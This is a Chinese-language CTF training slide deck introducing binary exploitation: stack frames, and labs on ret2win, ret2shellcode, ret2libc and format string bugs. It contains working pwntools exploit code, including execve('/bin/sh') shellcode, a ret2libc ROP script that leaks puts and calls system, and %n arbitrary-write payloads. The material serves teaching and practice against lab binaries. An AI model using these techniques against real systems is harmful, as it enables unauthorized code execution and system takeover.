---
theme: default
title:  Pwn 入门
info: |
  目标：当天能独立做出 1~2 道基础 Pwn 题，并掌握后续进阶路线
drawings:
  persist: false
transition: slide-left
mdc: true
layout: cover
---

<div class="cover-neon">
  <div class="brand">sixstars wintercamp</div>
  <h1>pwn入门</h1>
  <p class="subtitle">基础知识及实例分析</p>

  <div class="meta">
    <span>讲解人: Juryorca</span>
  </div>
</div>

<style>
.cover-neon{
  height: 100%;
  padding: 64px 72px;
  border-radius: 28px;
  background:
    radial-gradient(1200px 500px at 15% 20%, rgba(0,255,209,.25), transparent 60%),
    radial-gradient(900px 500px at 85% 25%, rgba(145,120,255,.22), transparent 55%),
    radial-gradient(900px 700px at 60% 90%, rgba(255,0,122,.18), transparent 60%),
    linear-gradient(135deg, #0b1020 0%, #070a14 45%, #05060f 100%);
  position: relative;
  overflow: hidden;
  box-shadow: 0 30px 90px rgba(0,0,0,.55);
}
.cover-neon:before{
  content:"";
  position:absolute; inset:-2px;
  background: linear-gradient(90deg, rgba(0,255,209,.35), rgba(145,120,255,.35), rgba(255,0,122,.25));
  filter: blur(24px);
  opacity:.55;
  pointer-events:none;
}
.cover-neon > *{ position: relative; }
.cover-neon .brand{
  display:inline-block;
  padding: 8px 14px;
  border: 1px solid rgba(255,255,255,.14);
  border-radius: 999px;
  background: rgba(255,255,255,.06);
  backdrop-filter: blur(10px);
  letter-spacing:.08em;
  text-transform: uppercase;
  font-size: 12px;
  color: rgba(255,255,255,.85);
}
.cover-neon h1{
  margin: 18px 0 10px;
  font-size: 56px;
  line-height: 1.05;
  font-weight: 800;
  color: #fff;
  text-shadow: 0 12px 40px rgba(0,0,0,.35);
}
.cover-neon .subtitle{
  font-size: 18px;
  color: rgba(255,255,255,.78);
  max-width: 720px;
  margin-top: 6px;
}
.cover-neon .meta{
  margin-top: 34px;
  display:flex;
  flex-wrap: wrap;
  gap: 10px;
}
.cover-neon .meta span{
  padding: 10px 14px;
  border-radius: 14px;
  border: 1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  color: rgba(255,255,255,.82);
  font-size: 14px;
}
.cover-neon .footer{
  position:absolute;
  left:72px; right:72px; bottom:42px;
  display:flex; align-items:center; justify-content:space-between;
  color: rgba(255,255,255,.55);
  font-size: 12px;
}
.cover-neon .tag{
  padding: 8px 12px;
  border-radius: 999px;
  border: 1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.05);
}
</style>


---

## 内容
1. **pwn介绍**
2. **函数调用与栈帧**
3. **Lab1：无保护栈溢出 → ret2win**
4. **Lab2：ret2shellcode**  
5. **Lab3：ret2libc**
6. **Lab4：格式化字符串认识**

---
layout: two-cols
---


<div class="h-full flex items-center justify-center">
  <h1 class="text-6xl font-extrabold">Pwn 是什么？</h1>
</div>

::right::
![](/whatispwn.png)

---
layout: two-cols
---

![](/pwn2.png)

Pwn 是由 own 引申而来的，它表示玩家处于胜利的优势。在黑客语法的俚语中，Pwn 是指攻破设备或者系统，发音类似「砰」。对黑客而言，利用一些漏洞成功实施黑客攻击，获取到服务器的权限并操纵，那么，This server just got pwned！

::right::

在 Pwn 题中，你经常会看到这样的目标：

- 程序本来：  
  👉 正常输入 → 正常退出
- 我们希望：  
  👉 通过一些“特殊输入” → 执行 `/bin/sh`

``` shell
./vuln
input: AAAAAAAAAA

whoami
ctf

python exp.py 

whoami
root
```
---
layout : two-cols
---
![](/pwn3.gif)

*动图取自https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html*

::right::

一个真实的利用的过程动图。它利用了老旧linux内核中的Netfilter组件相关漏洞

> CVE-2021-22555是Linux Netfilter中存在15年的堆栈越界写入漏洞，其威力足以绕过所有现代安全防护措施并实现内核代码执行。该漏洞曾被用于突破kCTF集群的Kubernetes Pod隔离机制，并为慈善事业赢得了10000美元奖金（谷歌将匹配捐款金额，使总捐赠额翻倍至20000美元）。

---
layout: section
---

# 函数调用与栈帧
学习栈上攻击手法的基础

---
layout: two-cols
---

``` c
int func(int x){
  int a = 0;
  return 0;
}
```

这个函数调用时 要临时存储什么信息？

局部变量、参数、返回值、返回地址(函数调用完之后下一个指令的地址)......

这些有一部分可以用寄存器来存储，但是由于个数限制，寄存器并不足以满足我们的所有要求。因此我们需要栈来实现这一功能。

::right::

在x86_64程序中 一个栈帧通常包含:
- 局部变量
- 返回地址

特殊情况下，会包含:
- 参数(参数超过6个时)
- 特殊寄存器的值(在递归函数中常见)


---
layout: two-cols
---
# 栈的结构
<StackFrame /> 

::right::

左侧结构是x86_64情况下栈的内容

- **stack args (7+)**  
  当参数过多时，放在栈上的参数区域（常见为第 7 个及以后的参数）。

- **return address**  
  函数执行结束后要回到的位置（也就是“返回后下一条指令的地址”）。

- **saved rbp**  
  保存上一层函数的“栈帧基址指针”（用于组织栈帧结构、便于回溯）。
  
- **callee-saved regs（可选）**  
  用来保存“某些寄存器的旧值”的区域（是否存在取决于编译器和函数实际用到哪些寄存器）。

- **local variables + padding**  
  局部变量使用的空间（例如 `a`、`buf[...]`），以及为了内存对齐/布局产生的填充区域。



---
layout: two-cols
---

<div class="h-full flex items-center justify-center">
  <StackPrologueAnim />
</div>

::right::

<div class="pl-8 pt-4">

# 函数开栈 (Prologue)

<div v-if="$clicks === 0" class="step-card">
  <p class="title">Step 0: 调用前准备</p>
  <p class="desc">此时处于 Caller 栈帧中。RSP 指向当前栈顶。</p>
  <pre><code>; 即将执行函数调用</code></pre>
</div>

<div v-else-if="$clicks === 1" class="step-card">
  <p class="title">Step 1: 参数压栈</p>
  <p class="desc">超过 6 个的参数被压入栈中</p>
  <pre><code>push arg7... ; 压入第7个的以及之后的参数</code></pre>
</div>

<div v-else-if="$clicks === 2" class="step-card">
  <p class="title">Step 2: 保存返回地址</p>
  <p class="desc"><code>call</code> 指令将下一条指令地址压栈。<b>RSP</b> 上移。</p>
  <pre><code>call func ; 自动压入返回地址</code></pre>
</div>

<div v-else-if="$clicks === 3" class="step-card">
  <p class="title">Step 3: 保存旧帧指针</p>
  <p class="desc">进入 Callee。首先保护 Caller 的 <code>rbp</code>。<b>RSP</b> 上移。</p>
  <pre><code>push rbp  ; 保护旧基址</code></pre>
</div>

<div v-else-if="$clicks === 4" class="step-card">
  <p class="title">Step 4: 建立新帧指针</p>
  <p class="desc"><b>RBP</b> 出现，并指向当前 <b>RSP</b>，锁定在新栈帧起始位。</p>
  <pre><code>mov rbp, rsp ; 栈帧基准建立</code></pre>
</div>

<div v-else class="step-card">
  <p class="title">Step 5: 空间分配与寄存器保护</p>
  <p class="desc">分配局部变量空间并保存 <b>Callee-saved</b> 寄存器。<b>RBP 不动</b>，<b>RSP</b> 上移。</p>
  <pre><code>push rbx      ; 保护寄存器
sub rsp, 0x40 ; 开辟局部空间</code></pre>
</div>

</div>

<div class="hidden">
  <span v-click></span>
  <span v-click></span>
  <span v-click></span>
  <span v-click></span>
  <span v-click></span>
</div>

<style>
.step-card {
  @apply p-4 rounded-lg bg-white/5 border border-white/10 mt-6 shadow-xl;
  animation: slideIn 0.3s ease-out;
}
.title { @apply text-lg font-bold text-primary mb-1; }
.desc { @apply text-sm opacity-80 leading-relaxed; }
pre { @apply mt-3 bg-black/40 p-2 rounded font-mono text-xs text-emerald-400; }
@keyframes slideIn {
  from { opacity: 0; transform: translateX(20px); }
  to { opacity: 1; transform: translateX(0); }
}
</style>

---
layout: two-cols
---

<div class="h-full flex items-center justify-center">
  <StackEpilogueAnim />
</div>

::right::

<div class="pl-8 pt-4">

# 函数退栈 (Epilogue)

<div v-if="$clicks === 0" class="step-card">
  <p class="title">Step 0: 函数执行完毕</p>
  <p class="desc">当前处于 Callee 栈帧顶端，准备开始清理工作。</p>
  <pre><code>; 执行清理逻辑...</code></pre>
</div>

<div v-else-if="$clicks === 1" class="step-card">
  <p class="title">Step 1: 释放局部变量</p>
  <p class="desc">通过移动 <b>RSP</b> 或弹出寄存器，销毁局部空间。<b>RSP</b> 回到 RBP 处。</p>
  <pre><code>mov rbx,QWORD PTR [rbp-0x8]; 恢复寄存器
leave(前半部分)     ;“清除”栈空间</code></pre>
  <p> leave相当于<br>mov rsp, rbp<br>
pop rbp</p>
</div>

<div v-else-if="$clicks === 2" class="step-card">
  <p class="title">Step 2: 恢复旧帧指针</p>
  <p class="desc">从栈中弹出旧的 <code>rbp</code>，<b>RBP</b> 回到 Caller 栈帧基址，<b>RSP</b> 指向返回地址。</p>
  <pre><code>leave(后半部分)       ; 恢复旧基址</code></pre>
</div>

<div v-else-if="$clicks === 3" class="step-card">
  <p class="title">Step 3: 执行返回</p>
  <p class="desc">执行 <code>ret</code> 指令，弹出 RIP。控制流回到 Caller，<b>RSP</b> 指向栈参数。</p>
  <pre><code>ret           ; 跳转回返回地址</code></pre>
</div>

<div v-else class="step-card">
  <p class="title">Step 4: Caller 清理参数</p>
  <p class="desc">根据调用惯例，Caller 销毁栈上传递的参数。栈恢复到调用前的状态。</p>
  <pre><code>add rsp, 8    ; 清理栈参数</code></pre>
</div>

</div>

<div class="hidden">
  <span v-click></span>
  <span v-click></span>
  <span v-click></span>
  <span v-click></span>
</div>

<style>
.step-card {
  @apply p-4 rounded-lg bg-white/5 border border-white/10 mt-6 shadow-xl;
  animation: slideIn 0.3s ease-out;
}
.title { @apply text-lg font-bold text-primary mb-1; }
.desc { @apply text-sm opacity-80 leading-relaxed; }
pre { @apply mt-3 bg-black/40 p-2 rounded font-mono text-xs text-emerald-400; }
@keyframes slideIn {
  from { opacity: 0; transform: translateX(20px); }
  to { opacity: 1; transform: translateX(0); }
}
</style>

--- 
layout: default
---

# 实例分析

一个参数特别多的函数和一个会强制修改rbx的函数
``` c
void func(int a1, int a2, int a3, int a4, int a5, int a6, int a7) {
  int i = 1;
  func(a1, a2, a3, a4, a5, a6, a7);
  return;
}

void func2() { asm volatile("mov $0xdeadbeef, %%rbx" : : : "rbx"); }
```

---
layout: section
---

# lab1: ret2win

---
layout: default
---

## 原理
返回地址决定着函数退出后要跳转到哪个指令。

汇编的ret指令相当于pop rip,它取出栈中的返回地址到rip寄存器中。
而rip寄存器中的值决定下一个指令的地址。

许多不安全的函数或者编程习惯可能导致缓冲区溢出。

比如gets函数，它可以向参数指向的位置无限写入，直到输入流中出现`\n`

---
layout: default
---

# pwntools模板

``` python
from pwn import *
context(arch = 'amd64')
filename = './vuln' # 替换为实际二进制程序名字
ip = "127.0.0.1" 
port = 9999 # 替换为实际的ip和端口

p = process(filename)
# 打远程时替换为 p = remote(ip,port)
payload = b"aasasdasdasdasdsadasdasas" #替换为实际要输入的内容
p.sendline(payload)
p.interactive()
```

- sendline() 最后带b'\n'
- send() 最后不带b'\n'
- p64/p32 方便的构造小端32位数对应的bytes和64位数对应的bytes的方法 直接和bytes拼接即可 
  例如: b'a'*114514 + p64(0xdeadbeef)

---
layout: center
---
# 尝试lab1！


---
layout: section
---

# lab2: ret2shellcode

---
layout: default
---

## 原理

ret2win：跳转到**已有的函数**  
ret2shellcode：跳转到**我们自己注入的代码**

> **核心思想：代码本质上也是数据！**

CPU 不区分代码和数据，我们可以：
1. 把机器码**当作数据写入**内存（如通过 `gets` 输入）
2. 让程序**跳转到那里执行** → 数据变成代码！

这块内存可以是栈或者是某个可以被写入的空间。

前提：内存可执行（NX 关闭或者在可任意写部分可执行） + 知道 shellcode 地址

---
layout: default
---

## pwntools shellcode 生成

```python
from pwn import *

context(arch='amd64', os='linux')

# 方法1: 使用 shellcraft 自动生成
shellcode = asm(shellcraft.sh())

# 方法2: 手写汇编
shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    push 0x68732f6e69622f  /* "/bin/sh" */
    mov rdi, rsp
    mov rax, 59
    syscall
''')

# 查看 shellcode
print(shellcode)  # 原始字节
print(disasm(shellcode))  # 反汇编查看
```

---
layout: two-cols-header
---

# 尝试 lab2！

::left::
栈地址通常是**随机化**的（ASLR）

在这个 lab 中会**直接给出**地址  
但是在真实比赛中通常**不会**！

需要通过：
- 信息泄露
- 格式化字符串
- 其他漏洞获取地址

::right::

## pwntools 读取程序输出相关函数

```python
# 接收直到指定字符串
p.recvuntil(b"address: ")

# 接收一行（到 \n）
line = p.recvline()

# 接收指定字节数
data = p.recv(16)

# 接收全部（直到EOF）
data = p.recvall()

# 示例：读取地址
p.recvuntil(b"buf addr: ")
addr = int(p.recvline(), 16)  # 十六进制转换
print(hex(addr))
```

 
---
layout: section
---

# lab3: ret2libc

---
layout: default
---

## 原理

当栈不可执行（NX 开启）且没有现成的 `win` 函数时，我们可以“借用” libc 中的函数（常见是 `system`）来获得 shell。

libc是Linux系统中遵循ANSI C标准的函数库，所有C程序均依赖该库运行。因此libc中有大量的函数或者代码块可以借用。

通常的c程序是使用动态链接的方式加载libc的，而加载的基地址是随机的，因此需要通过一次地址泄露来计算libc基地址。

泄露之后则可以通过相对偏移计算出libc中的任意代码的位置。

---
layout: default
---

实战里往往不止要改返回地址，还要给被调用的函数传参。

单纯覆盖返回地址只能改下一跳的 RIP，无法设置 RDI/RSI 等寄存器；找到一个 `pop rdi; ret` 这样的 gadget，就能把栈上的下一个 8 字节送进 RDI，作为第一个参数。然后紧接着利用到第二个返回地址

把多个 gadget 按顺序拼在栈上，让程序一次次 `ret` 跳过去执行，就能逐步布置参数并调用目标函数，这就是面向返回编程（ROP）。

> ROPgadget工具可以帮助我们寻找gadget ,用法如下：
``` shell
ROPgadget --binary filename
```
---
layout: default
---

## ROP 执行流动画演示 (ret2libc)

<RopAnimation />

<br>

---
layout: two-cols
---
## 关键点

一定要对应好libc库的版本！

做题时，如果和libc版本有关，题目附件里一般会给出对应的libc.so.6文件。

有些较为好心的题会给出动态链接器文件(一般为ld开头例如`ld-linux-x86-64.so.2`)

用 patchelf 工具可以为二进制指定动态链接器与库搜索路径，或替换依赖，确保加载指定版本的 libc：

对于没有给出链接器的题，可以在glibc-all-in-one中找，或者在 https://launchpad.net/ubuntu 中找

> 通过以下指令确定libc.so.6的版本
``` shell
strings ./libc.so.6|grep ubuntu
```
::right::

```shell
# 固定动态链接器
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./vuln

# 替换依赖的 libc 
patchelf --replace-needed libc.so.6 ./libc-2.27.so ./vuln

# 验证实际加载到的库与路径
ldd ./vuln
```

> 注意：动态链接器与 libc 需要匹配同一版本族；不匹配可能导致符号解析错误或崩溃。




---
layout: default
---

```python
from pwn import *

context(arch='amd64')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process(elf.path)

offset = 72
pop_rdi = 0x4012b3   # ROPgadget --binary vuln --only 'pop rdi'
ret = 0x40101a       # 单条 ret 做栈对齐

# 题目启动时直接打印 puts 地址
p.recvuntil(b"puts: ")
leaked_puts = int(p.recvline().strip(), 16)
libc_base = leaked_puts - libc.sym['puts']
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))  #也可以在栈上写入字符串，控制rdi为字符串的地址。

# 直接 call system('/bin/sh')
payload = b'A'*offset
payload += p64(ret)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system)
p.sendline(payload)

p.interactive()
```

---
layout: default
---

# 栈对齐问题

某些函数对于栈对齐的要求较高，比如`system`、`printf`等。

这通常和xmm寄存器相关：在x86_64 ABI中，**某些使用SSE指令（xmm寄存器）的函数要求`RSP % 16 == 0`**，即栈指针需要是16字节的倍数。

### 栈对齐的调整方式

看入栈的push rbp步骤完成后，rsp的值是否是16的倍数 

还有个方法就是看最后一个`ret`地址是不是16的倍数，但是前提是从函数开头进入目标函数。

如果不是对齐的，ropchain中加入`ret`即可

###  快速判断
看程序是不是在目标函数中崩溃，甚至可以看崩溃是不是涉及到xmm寄存器。

---
layout: center
---
# 尝试lab3！

---
layout: section
---

# Lab4: 格式化字符串

---
layout: default
---

## 什么是格式化字符串漏洞？

当程序使用 `printf` 族函数时，如果没有正确使用格式字符串，就可能导致漏洞：

```c
// 正确用法
printf("Hello %s\n", username);

// 危险用法！
printf(username);  // 如果 username 是 "%p %p %p"，会泄露栈上数据
```

**核心原理**：`printf` 无法判断参数个数，而是根据格式化字符串中的对应标记决定如何取参数。

- 📖 **读取任意内存** (`%p`, `%x`, `%s`)
- ✍️ **写入任意内存** (`%n`)

---
layout: image-left
image: /pwn4.jpg
---


## 常用格式化字符串符号

| 符号 | 功能 | 示例 |
|------|------|------|
| `%p` | 打印指针（16进制地址） | `0x7ffc12345678` |
| `%x` | 打印16进制数（4字节） | `deadbeef` |
| `%lx` | 打印16进制数（8字节） | `00007ffc12345678` |
| `%s` | 打印字符串（从指针读） | `hello world` |
| `%c` | 打印字符 | `A` |
| `%d` | 打印十进制整数 | `1234` |
| `%n` | **写入**已输出字符数 | *写入内存* |


---
layout: default
---

## 格式化字符串参数读取顺序 (x86_64)

在 x86_64 架构下，`printf` 函数参数传递遵循 System V ABI：

1. **前 6 个参数** → 寄存器：`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`
2. **第 7+ 个参数** → 栈上（从低地址到高地址）

```c
printf(fmt, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, ...);
//     RDI  RSI   RDX   RCX   R8    R9    栈+0  栈+8  ...
```
**实战技巧**：先用 `%p %p %p %p...` 大量打印，找到自己输入的特征字符（如 `0x4141414141`）在第几个位置。

## "$"（位置参数）

在 glibc 的 `printf` 中，`k$` 语法可以**直接指定第 k 个参数**，让这个利用手法更加强大：
> k从0开始 即`fmt`变量是第0个
```
%7$p   # 打印第 7 个参数为指针
%6$lx  # 以 16 进制长整型打印第 6 个参数
%7$s   # 将第 7 个参数当作指针，打印其指向的字符串
%7$n   # 将已输出的字符数写入第 7 个参数指向的地址
%7$hhn # 写入 1 字节；%7$hn 写入 2 字节；%7$n 写入 8 字节（long）
```

---
layout: default
---

## fmtstr_payload - pwntools 的格式化字符串利用工具

pwntools 提供了 `fmtstr_payload` 函数，可以自动生成格式化字符串 payload：

```python
from pwn import *
payload = fmtstr_payload(offset=6, writes={0x404040: 0xdeadbeef})
payload = fmtstr_payload(6, {
    0x404040: 0x12345678,
    0x404048: 0xdeadbeef,
    0x404050: 0xcafebabe
})

p.sendline(payload)
```

### 参数说明
- `offset`: 你的输入在栈上作为第几个参数（从 `printf` 的第二个参数开始算）
- `writes`: 字典形式 `{目标地址: 要写入的值}`
- `numbwritten`: 已输出的字符数（默认0）
- `write_size`: 每次写入的字节数，`'byte'`/`'short'`/`'int'`（默认自动）
> 见 https://juejin.cn/post/7424326583970775081 

---
layout: center
---

# 尝试lab4!

